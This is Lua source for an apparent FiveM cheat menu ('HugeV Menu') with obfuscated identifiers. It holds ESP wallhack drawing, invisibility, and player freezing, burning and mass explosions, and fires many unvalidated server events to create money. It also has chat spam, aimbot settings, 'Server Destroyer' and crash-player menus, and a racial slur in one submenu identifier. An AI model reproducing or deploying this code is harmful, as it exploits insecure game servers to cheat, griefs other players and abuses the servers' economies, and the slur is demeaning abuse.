                  local TLineOneEnd_UDGUFYIHIFGDFG = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, -0.3, 0.8)
                  local TLineTwoBegin_DIOUHGIUDFGDF = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, -0.3, 0.8)
                  local TLineTwoEnd_DSUGHIUFSDGDF = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, 0.3, 0.8)
                  local TLineThreeBegin_IDUSHGIUDFGDF = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, 0.3, 0.8)
                  local TLineThreeEnd_DUSYGUIDSGDF = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, 0.3, 0.8)
                  local TLineFourBegin_DSUGYFISDGDF = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, -0.3, 0.8)

                  local ConnectorOneBegin_DSUGHISDUGDFG = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, 0.3, 0.8)
                  local ConnectorOneEnd_DUSGIHUDGDFG = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, 0.3, -0.9)
                  local ConnectorTwoBegin_USDHIUFDSGDFG = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, 0.3, 0.8)
                  local ConnectorTwoEnd_QUTGFIDYGFSUGFSG = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, 0.3, -0.9)
                  local ConnectorThreeBegin_LDSIGHSDGHKDFSGDF = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, -0.3, 0.8)
                  local ConnectorThreeEnd_UAIDGYIHDSHGODF = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, -0.3, -0.9)
                  local ConnectorFourBegin_SDUYFGTUDSIGDFG = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, -0.3, 0.8)
                  local ConnectorFourEnd_ASUHYFIUDSGDFG = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, -0.3, -0.9)

                  Czitirzen_Invoke(0x6B7256074AE34680, 
                  LineOneBegin_GDUYSYUFDGREGDFG.x,
                  LineOneBegin_GDUYSYUFDGREGDFG.y,
                  LineOneBegin_GDUYSYUFDGREGDFG.z,
                  LineOneEnd_DUIYGUISHIGFDGFDG.x,
                  LineOneEnd_DUIYGUISHIGFDGFDG.y,
                  LineOneEnd_DUIYGUISHIGFDGFDG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Czitirzen_Invoke(0x6B7256074AE34680, 
                  LineTwoBegin_UIDSGISDGGFDGF.x,
                  LineTwoBegin_UIDSGISDGGFDGF.y,
                  LineTwoBegin_UIDSGISDGGFDGF.z,
                  LineTwoEnd_DISUIHFIUSDGDF.x,
                  LineTwoEnd_DISUIHFIUSDGDF.y,
                  LineTwoEnd_DISUIHFIUSDGDF.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Czitirzen_Invoke(0x6B7256074AE34680, 
                  LineThreeBegin_UDHIGUFFDGIHUDF.x,
                  LineThreeBegin_UDHIGUFFDGIHUDF.y,
                  LineThreeBegin_UDHIGUFFDGIHUDF.z,
                  LineThreeEnd_DSUYFTUDSGYFDSFG.x,
                  LineThreeEnd_DSUYFTUDSGYFDSFG.y,
                  LineThreeEnd_DSUYFTUDSGYFDSFG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Czitirzen_Invoke(0x6B7256074AE34680, 
                  LineThreeEnd_DSUYFTUDSGYFDSFG.x,
                  LineThreeEnd_DSUYFTUDSGYFDSFG.y,
                  LineThreeEnd_DSUYFTUDSGYFDSFG.z,
                  LineFourBegin_SUAYGFTDGSUYFSD.x,
                  LineFourBegin_SUAYGFTDGSUYFSD.y,
                  LineFourBegin_SUAYGFTDGSUYFSD.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Czitirzen_Invoke(0x6B7256074AE34680, 
                  TLineOneBegin_DGUFYHDSIGDFHU.x,
                  TLineOneBegin_DGUFYHDSIGDFHU.y,
                  TLineOneBegin_DGUFYHDSIGDFHU.z,
                  TLineOneEnd_UDGUFYIHIFGDFG.x,
                  TLineOneEnd_UDGUFYIHIFGDFG.y,
                  TLineOneEnd_UDGUFYIHIFGDFG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Czitirzen_Invoke(0x6B7256074AE34680, 
                  TLineTwoBegin_DIOUHGIUDFGDF.x,
                  TLineTwoBegin_DIOUHGIUDFGDF.y,
                  TLineTwoBegin_DIOUHGIUDFGDF.z,
                  TLineTwoEnd_DSUGHIUFSDGDF.x,
                  TLineTwoEnd_DSUGHIUFSDGDF.y,
                  TLineTwoEnd_DSUGHIUFSDGDF.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Czitirzen_Invoke(0x6B7256074AE34680, 
                  TLineThreeBegin_IDUSHGIUDFGDF.x,
                  TLineThreeBegin_IDUSHGIUDFGDF.y,
                  TLineThreeBegin_IDUSHGIUDFGDF.z,
                  TLineThreeEnd_DUSYGUIDSGDF.x,
                  TLineThreeEnd_DUSYGUIDSGDF.y,
                  TLineThreeEnd_DUSYGUIDSGDF.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Czitirzen_Invoke(0x6B7256074AE34680, 
                  TLineThreeEnd_DUSYGUIDSGDF.x,
                  TLineThreeEnd_DUSYGUIDSGDF.y,
                  TLineThreeEnd_DUSYGUIDSGDF.z,
                  TLineFourBegin_DSUGYFISDGDF.x,
                  TLineFourBegin_DSUGYFISDGDF.y,
                  TLineFourBegin_DSUGYFISDGDF.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Czitirzen_Invoke(0x6B7256074AE34680, 
                  ConnectorOneBegin_DSUGHISDUGDFG.x,
                  ConnectorOneBegin_DSUGHISDUGDFG.y,
                  ConnectorOneBegin_DSUGHISDUGDFG.z,
                  ConnectorOneEnd_DUSGIHUDGDFG.x,
                  ConnectorOneEnd_DUSGIHUDGDFG.y,
                  ConnectorOneEnd_DUSGIHUDGDFG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Czitirzen_Invoke(0x6B7256074AE34680, 
                  ConnectorTwoBegin_USDHIUFDSGDFG.x,
                  ConnectorTwoBegin_USDHIUFDSGDFG.y,
                  ConnectorTwoBegin_USDHIUFDSGDFG.z,
                  ConnectorTwoEnd_QUTGFIDYGFSUGFSG.x,
                  ConnectorTwoEnd_QUTGFIDYGFSUGFSG.y,
                  ConnectorTwoEnd_QUTGFIDYGFSUGFSG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Czitirzen_Invoke(0x6B7256074AE34680, 
                  ConnectorThreeBegin_LDSIGHSDGHKDFSGDF.x,
                  ConnectorThreeBegin_LDSIGHSDGHKDFSGDF.y,
                  ConnectorThreeBegin_LDSIGHSDGHKDFSGDF.z,
                  ConnectorThreeEnd_UAIDGYIHDSHGODF.x,
                  ConnectorThreeEnd_UAIDGYIHDSHGODF.y,
                  ConnectorThreeEnd_UAIDGYIHDSHGODF.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Czitirzen_Invoke(0x6B7256074AE34680, 
                  ConnectorFourBegin_SDUYFGTUDSIGDFG.x,
                  ConnectorFourBegin_SDUYFGTUDSIGDFG.y,
                  ConnectorFourBegin_SDUYFGTUDSIGDFG.z,
                  ConnectorFourEnd_ASUHYFIUDSGDFG.x,
                  ConnectorFourEnd_ASUHYFIUDSGDFG.y,
                  ConnectorFourEnd_ASUHYFIUDSGDFG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                end
                if esplines_IDSUHGIUFDHGUDFHIG and esp_duhsgiudfgdfg then
                  Czitirzen_Invoke(0x6B7256074AE34680, cx_duihsgiudfgdf, cy_duhifsudgsdfg, cz_dsyaugfidsgsdf, x, y, z, kolorek_espa_xd_IDHFUDSHUIFDSF.r, kolorek_espa_xd_IDHFUDSHUIFDSF.g, kolorek_espa_xd_IDHFUDSHUIFDSF.b, 255)
                end
              end
            end
          end
          end
		  
if spectate_global_dugsuydhkgsdfgdf then
local coords_dugsudhgsdf = GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, player_global_UDHFUYDSHFIGUFDG))
local entityfdhudfkidfh = Czitirzen_Invoke(0x997ABD671D25CA0B, Czitirzen_Invoke(0xD80958FC74E988A6), false) and Czitirzen_Invoke(0x6094AD011A2EA87D, Czitirzen_Invoke(0xD80958FC74E988A6)) or Czitirzen_Invoke(0xD80958FC74E988A6)
Czitirzen_Invoke(0x06843DA7060A026B, entityfdhudfkidfh, coords_dugsudhgsdf.x, coords_dugsudhgsdf.y, coords_dugsudhgsdf.z+5, 0.0, 0.0, 0.0, false)
Czitirzen_Invoke(0xEA1C610A04DB6BBB, entityfdhudfkidfh, false, 0)
end

if Niewidzialnosc_UGDIUGHIFUGFDGDFG then
    Czitirzen_Invoke(0xEA1C610A04DB6BBB, Czitirzen_Invoke(0xD80958FC74E988A6), false, false)
    Czitirzen_Invoke(0x241E289B5C059EDC, Czitirzen_Invoke(0xD80958FC74E988A6), true)
    Czitirzen_Invoke(0x44A0870B7E92D7C0, Czitirzen_Invoke(0xD80958FC74E988A6), 150)
else
    Czitirzen_Invoke(0xEA1C610A04DB6BBB, Czitirzen_Invoke(0xD80958FC74E988A6), true, true)
    Czitirzen_Invoke(0x44A0870B7E92D7C0, Czitirzen_Invoke(0xD80958FC74E988A6), 255)
end

if Reveal_Niewidzialnych_UIFHDFGIDUFHGIUDF then
    local plist_iduygusdigsdfg = GetActivePlayers_HugeV_UDGYUDFIGKDFGDF()
for i_didsfyg98sduriesdfg = 0, #plist_iduygusdigsdfg do
if not Czitirzen_Invoke(0xD796CB5BA8F20E32, Czitirzen_Invoke(0x43A66C31C68491C0, plist_iduygusdigsdfg[i_didsfyg98sduriesdfg])) then
    Czitirzen_Invoke(0xEA1C610A04DB6BBB, Czitirzen_Invoke(0x43A66C31C68491C0, plist_iduygusdigsdfg[i_didsfyg98sduriesdfg]), false, false)
    Czitirzen_Invoke(0x241E289B5C059EDC, Czitirzen_Invoke(0x43A66C31C68491C0, plist_iduygusdigsdfg[i_didsfyg98sduriesdfg]), true)
    Czitirzen_Invoke(0x44A0870B7E92D7C0, Czitirzen_Invoke(0x43A66C31C68491C0, plist_iduygusdigsdfg[i_didsfyg98sduriesdfg]), 200)
end
end
end

if FreezePlayer_HugeV_SDIGDSOGSDG then
Czitirzen_Invoke(0xAAA34F8A7CB32098, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD))
Czitirzen_Invoke(0x428CA6DBD1094446, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), true)
else
Czitirzen_Invoke(0x428CA6DBD1094446, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), false)
end

if MolotovPlayer_HugeV_SDIUGHDSGSD then
	Czitirzen_Invoke(0xE3AD2BDBAEE269AC, GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD)), 3, 100000.0, true, false, 100000.0)
end

if ShakePlayerCam_HugeV_SDGIUHDSUGSD then
	Czitirzen_Invoke(0xE3AD2BDBAEE269AC, GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD)), 4, 0.0, false, true, 10000000000.0)
end

if Flare_HugeV_SDGUISHDUGSD then
Czitirzen_Invoke(0xE3AD2BDBAEE269AC, GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD)), 22, 100000.0, true, false, 0.0)
end

if Hydrant_HugeV_SDGUHISDGDSG then
local coords_DSUGHSIDUGSDG = GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD))
Czitirzen_Invoke(0xE3AD2BDBAEE269AC, coords_DSUGHSIDUGSDG.x, coords_DSUGHSIDUGSDG.y, coords_DSUGHSIDUGSDG.z-1, 13, 100000.0, true, false, 0.0)
end

if MakeYouFlare_HugeV_UDYUFGDUYFGIDFGF then
local coords_UYDUHIFGDGFD = GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, -1))
Czitirzen_Invoke(0xE3AD2BDBAEE269AC, coords_UYDUHIFGDGFD.x, coords_UYDUHIFGDGFD.y, coords_UYDUHIFGDGFD.z, 22, 100000.0, true, false, 0.0)
end

if explodeall_hugev_private_IUDUHIUGFDHIUOGDR then
	for i_didsfyg98sduriesdfg = 0, 128 do
		Czitirzen_Invoke(0xE3AD2BDBAEE269AC, GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, i_didsfyg98sduriesdfg)), 8, 100000.0, true, false, 100000.0)
	end
end

if HTYJKUKYUKYUKUKY then

    TriggerServerEvent('_chat:messageEntered', "HugeV On Top!", { 141, 211, 255 }, "HugeV Menu")
	TriggerServerEvent('_chat:messageEntered', "HugeV On Top!", { 141, 211, 255 }, "HugeV Menu")
	TriggerServerEvent('_chat:messageEntered', "HugeV On Top!", { 141, 211, 255 }, "HugeV Menu")
	TriggerServerEvent('_chat:messageEntered', "HugeV On Top!", { 141, 211, 255 }, "HugeV Menu")
	TriggerServerEvent('_chat:messageEntered', "HugeV On Top!", { 141, 211, 255 }, "HugeV Menu")
	TriggerServerEvent('_chat:messageEntered', "HugeV On Top!", { 141, 211, 255 }, "HugeV Menu")
	TriggerServerEvent('_chat:messageEntered', "HugeV On Top!", { 141, 211, 255 }, "HugeV Menu")
	TriggerServerEvent('_chat:messageEntered', "HugeV On Top!", { 141, 211, 255 }, "HugeV Menu")
	TriggerServerEvent('_chat:messageEntered', "HugeV On Top!", { 141, 211, 255 }, "HugeV Menu")
	TriggerServerEvent('_chat:messageEntered', "HugeV On Top!", { 141, 211, 255 }, "HugeV Menu")
	TriggerServerEvent('_chat:messageEntered', "HugeV On Top!", { 141, 211, 255 }, "HugeV Menu")
	TriggerServerEvent('_chat:messageEntered', "HugeV On Top!", { 141, 211, 255 }, "HugeV Menu")
	TriggerServerEvent('_chat:messageEntered', "HugeV On Top!", { 141, 211, 255 }, "HugeV Menu")
	TriggerServerEvent('_chat:messageEntered', "HugeV On Top!", { 141, 211, 255 }, "HugeV Menu")
	TriggerServerEvent('_chat:messageEntered', "HugeV On Top!", { 141, 211, 255 }, "HugeV Menu")
	TriggerServerEvent('_chat:messageEntered', "HugeV On Top!", { 141, 211, 255 }, "HugeV Menu)")
	TriggerServerEvent('_chat:messageEntered', "HugeV On Top!", { 141, 211, 255 }, "HugeV Menu")

end

if RainbowVehicle_DSGUHSDGDS then
local color_DSGHSUDGSD = RGB_Rainbow_DSUGSIDGSD(1.0)
Czitirzen_Invoke(0x7141766F91D15BEA, GetVehiclePedIsIn_HugeV_IDHUFYUHSUDGFD(Czitirzen_Invoke(0x43A66C31C68491C0, -1)), color_DSGHSUDGSD.r, color_DSGHSUDGSD.g, color_DSGHSUDGSD.b)
Czitirzen_Invoke(0x36CED73BFED89754, GetVehiclePedIsIn_HugeV_IDHUFYUHSUDGFD(Czitirzen_Invoke(0x43A66C31C68491C0, -1)), color_DSGHSUDGSD.r, color_DSGHSUDGSD.g, color_DSGHSUDGSD.b)
end

if Vehicle_GodMode_DSIGHSDIUGIDS then
Czitirzen_Invoke(0x3882114BDE571AD4, GetVehiclePedIsIn_HugeV_IDHUFYUHSUDGFD(Czitirzen_Invoke(0xD80958FC74E988A6)), true)
Czitirzen_Invoke(0x59BF8C3D52C92F66, GetVehiclePedIsIn_HugeV_IDHUFYUHSUDGFD(Czitirzen_Invoke(0xD80958FC74E988A6)), false)
end

if SpeedBoost_DSUGHSDUIGDS then
Czitirzen_Invoke(0x93A3996368C94158, GetVehiclePedIsIn_HugeV_IDHUFYUHSUDGFD(Czitirzen_Invoke(0x43A66C31C68491C0, -1), false), 9999.0 * 20.0)
else
Czitirzen_Invoke(0x93A3996368C94158, GetVehiclePedIsIn_HugeV_IDHUFYUHSUDGFD(Czitirzen_Invoke(0x43A66C31C68491C0, -1), false), 20.0)
end

end
end)

------------------------------------------------------------------------------------------------------------------------------------------

-- Budowa menu --
CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
	local fastrun_speed_dsfjgh9oerwgh9od = 1
	local cur_action_duhgsidugsdfg = 1
	local sel_action_duhgsidugsdfg = 1
	--ChangeModel_Hugev_SDGISDGSD("csb_ramp_marine")
	

	CreateMenu_tdrfyuweghfbidsger('MainMenu_Bypass_mode_XD', '')
	SetTitleBackgroundSprite_odigosheoglsfjg('MainMenu_Bypass_mode_XD', 'shopui_title_graphics_franklin', 'shopui_title_graphics_franklin')
	
	CreateSubMenu_oipdgiseorghiuseoge('SelfMenu_IHJIDLSGEG', 'MainMenu_Bypass_mode_XD', 'Self Menu')
	CreateSubMenu_oipdgiseorghiuseoge('Super_Powers_Skurwysynku', 'SelfMenu_IHJIDLSGEG', 'Super Powers')
	CreateSubMenu_oipdgiseorghiuseoge('Outfit_SDUGHSIDUGSDG', 'SelfMenu_IHJIDLSGEG', 'Outfit Menu')
	CreateSubMenu_oipdgiseorghiuseoge('Peds_DSGHSDIUG', 'SelfMenu_IHJIDLSGEG', 'Peds Menu')
	CreateSubMenu_oipdgiseorghiuseoge('ServerDestoryer_JFHEJGHERKGHEKJGHEK', 'MainMenu_Bypass_mode_XD', 'Destroyer Menu')
	CreateSubMenu_oipdgiseorghiuseoge('VisualMenu_duagyo8e7rgsdfg', 'MainMenu_Bypass_mode_XD', 'Visual Menu')
	CreateSubMenu_oipdgiseorghiuseoge('WeaponMenu_UDHSGOSDUFGIDSF', 'MainMenu_Bypass_mode_XD', 'Weapon Menu')
	CreateSubMenu_oipdgiseorghiuseoge('OnlinePlayers_UITASIGFDSGSDGS', 'MainMenu_Bypass_mode_XD', 'Online Players')
	CreateSubMenu_oipdgiseorghiuseoge('OnlineTrollMenu_DIFSYUGISERUDF', 'OnlinePlayers_UITASIGFDSGSDGS', 'Online Options')
	CreateSubMenu_oipdgiseorghiuseoge('Crashes_Vehicles_hugehtrugertk', 'OnlineTrollMenu_DIFSYUGISERUDF', 'Crash ~g~Player Options')
	CreateSubMenu_oipdgiseorghiuseoge('WeaponMenu_SingleWepSpawner_IDSHGOIUSDFGLDSF', 'WeaponMenu_UDHSGOSDUFGIDSF', 'Single Weapon Spawner')
	CreateSubMenu_oipdgiseorghiuseoge('Weapon_Customization_Menu_DUHGIFSUDHGUSF', 'WeaponMenu_UDHSGOSDUFGIDSF', 'Weapon Customization')
	CreateSubMenu_oipdgiseorghiuseoge('VehicleMenu_UDG8SIDU', 'MainMenu_Bypass_mode_XD', 'Vehicle Menu')
	CreateSubMenu_oipdgiseorghiuseoge('Spawn_Vehicle_Options_UDHUGFIDFHOGDF', 'VehicleMenu_UDG8SIDU', 'Spawn Vehicle Options')
	CreateSubMenu_oipdgiseorghiuseoge('TrollOptions_DUHGSIUDHGIUDFSGDF', 'OnlineTrollMenu_DIFSYUGISERUDF', 'Troll Options')
	CreateSubMenu_oipdgiseorghiuseoge('TeleportOnlineTrollOptionsghurehguke_ghrueghek', 'OnlineTrollMenu_DIFSYUGISERUDF', 'Troll Options')
	CreateSubMenu_oipdgiseorghiuseoge('Maps_Props_IAJSIFOJDISGSDG', 'TeleportOnlineTrollOptionsghurehguke_ghrueghek', 'Maps Prop')
	CreateSubMenu_oipdgiseorghiuseoge('Flaps_Props_DSIUGHIUDSHGISD', 'TeleportOnlineTrollOptionsghurehguke_ghrueghek', 'Flag Props')
	CreateSubMenu_oipdgiseorghiuseoge('TeleportMenu_FODIYUGISDFG', 'MainMenu_Bypass_mode_XD', 'Teleport Menu')
	CreateSubMenu_oipdgiseorghiuseoge('ServerOptions_dugdas8u8gy3wo4hgdf', 'MainMenu_Bypass_mode_XD', 'Server Options')
	CreateSubMenu_oipdgiseorghiuseoge('AntyCheats_OSDAIYG3487GHDFG', 'ServerOptions_dugdas8u8gy3wo4hgdf', 'Antycheats')
	CreateSubMenu_oipdgiseorghiuseoge('ESX_Menu_DUSHGIUHIUDGHIUDFHIGUDF', 'MainMenu_Bypass_mode_XD', 'ESX Menu')
	CreateSubMenu_oipdgiseorghiuseoge('skrypt_nigger_DSUIGHSIDUGHIUDSy_UDSGIS8GE7IOW4U3DSF', 'ServerOptions_dugdas8u8gy3wo4hgdf', 'Scripts')
	CreateSubMenu_oipdgiseorghiuseoge('Weather_IODSSDFGIDS', 'VisualMenu_duagyo8e7rgsdfg', 'Weather')
	CreateSubMenu_oipdgiseorghiuseoge('ESP_MENU_DUHFIDSUGHUIDFG', 'VisualMenu_duagyo8e7rgsdfg', 'Esp Menu')
	CreateSubMenu_oipdgiseorghiuseoge('Settings_IUYDGUKSGDFGDFG', 'MainMenu_Bypass_mode_XD', 'Settings')
	CreateSubMenu_oipdgiseorghiuseoge('Configs_SDGUSIDGDS', 'Settings_IUYDGUKSGDFGDFG', 'Configs')
	CreateSubMenu_oipdgiseorghiuseoge('Themes_DSGUHSDIUGSD', 'Settings_IUYDGUKSGDFGDFG', 'Themes')
	CreateSubMenu_oipdgiseorghiuseoge('Credits_UGDYDSFGIUFDGDF', 'Settings_IUYDGUKSGDFGDFG', 'Credits')
	CreateSubMenu_oipdgiseorghiuseoge('Menu_Credits_UGDYDSFGIUFDGDF', 'Credits_UGDYDSFGIUFDGDF', 'Menu Credits')


	while Wlaczone_Menu_XD_dugao8iugsgsergsdfg do
		if IsMenuOpened_dghiusergisehrubgiusdfesg('MainMenu_Bypass_mode_XD') then
		    if MenuButton_eytfudskfbukdsger('Self Menu', 'SelfMenu_IHJIDLSGEG') then
			elseif MenuButton_eytfudskfbukdsger("Online Players", "OnlinePlayers_UITASIGFDSGSDGS") then
			elseif MenuButton_eytfudskfbukdsger("Visual Options", 'VisualMenu_duagyo8e7rgsdfg') then
			elseif MenuButton_eytfudskfbukdsger('Vehicle Menu', 'VehicleMenu_UDG8SIDU') then
			elseif MenuButton_eytfudskfbukdsger('Teleport Menu', 'TeleportMenu_FODIYUGISDFG') then
			elseif MenuButton_eytfudskfbukdsger("Weapon Menu", "WeaponMenu_UDHSGOSDUFGIDSF") then
			elseif MenuButton_eytfudskfbukdsger("Server Destroyer", "ServerDestoryer_JFHEJGHERKGHEKJGHEK") then
			elseif MenuButton_eytfudskfbukdsger("Money Menu", "ESX_Menu_DUSHGIUHIUDGHIUDFHIGUDF") then
			elseif MenuButton_eytfudskfbukdsger("Server Options", 'ServerOptions_dugdas8u8gy3wo4hgdf') then
			elseif MenuButton_eytfudskfbukdsger("Settings", 'Settings_IUYDGUKSGDFGDFG') then
			elseif Button_yetwyfguydfkjesrg('~r_djguisernglse~Exit ') then
			Wlaczone_Menu_XD_dugao8iugsgsergsdfg = false
			end
			
			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('Themes_DSGUHSDIUGSD') then
		if Button_yetwyfguydfkjesrg("~g~Standard") then
		DSUHGSIUD_theme_green = true
		DSUHGSIUD_theme_red = false
		DSUHGSIUD_theme_blue = false
		DSUHGSIUD_theme_purple = false
		LoadGif_DSGHDSIUGSDG()
		elseif Button_yetwyfguydfkjesrg("~p~Purple") then
		DSUHGSIUD_theme_green = false
		DSUHGSIUD_theme_red = false
		DSUHGSIUD_theme_blue = false
		DSUHGSIUD_theme_purple = true
		LoadGif_DSGHDSIUGSDG()
		
		end
			
			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('Configs_SDGUSIDGDS') then
		if Button_yetwyfguydfkjesrg("~r~[ PVP ]") then
		legit_aimbot_toogle_duygsudhkgsdfgsdfg = true
		draw_aimbot_fov_DHGSIUGDSGDF = true
		current_fov_SUHFIUSDFSDF = 1
		fov_x_DISFISDUSGFDG = 0.45
		fov_x2_DISFISDUSGFDG = 0.55
		fov_y_DISFISDUSGFDG = 0.45
		fov_y2_DISFISDUSGFDG = 0.55
		PushNotification_DSGJHDSGHSIDUGDS("PVP Config loaded")
		end
			
			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('ESX_Menu_DUSHGIUHIUDGHIUDFHIGUDF') then
				if Button_yetwyfguydfkjesrg("Automatic Money ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = KeyBoardInput_jdhgijslrgeg("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
				TriggerServerEvent('esx_truckerjob:pay', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('vrp_slotmachine:server:2', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent("esx_pizza:pay", WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('esx_jobs:caution', 'give_back', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('lscustoms:payGarage', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('esx_tankerjob:pay', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('gambling:spend', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('AdminMenu:giveBank', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('AdminMenu:giveCash', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('esx_slotmachine:sv:2', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('esx_truckerjob:pay', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('esx_moneywash:deposit', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('esx_moneywash:withdraw', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('esx_moneywash:deposit', WYNIK_TWOJEGO_STAREGO)
			    TriggerServerEvent('mission:completed', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('truckerJob:success',WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', WYNIK_TWOJEGO_STAREGO)
				end
			elseif Button_yetwyfguydfkjesrg("CAUTION ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = KeyBoardInput_jdhgijslrgeg("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
				TriggerServerEvent("esx_jobs:caution", "give_back", WYNIK_TWOJEGO_STAREGO)
				end
			elseif Button_yetwyfguydfkjesrg("TRUCKER ", "ESX") then
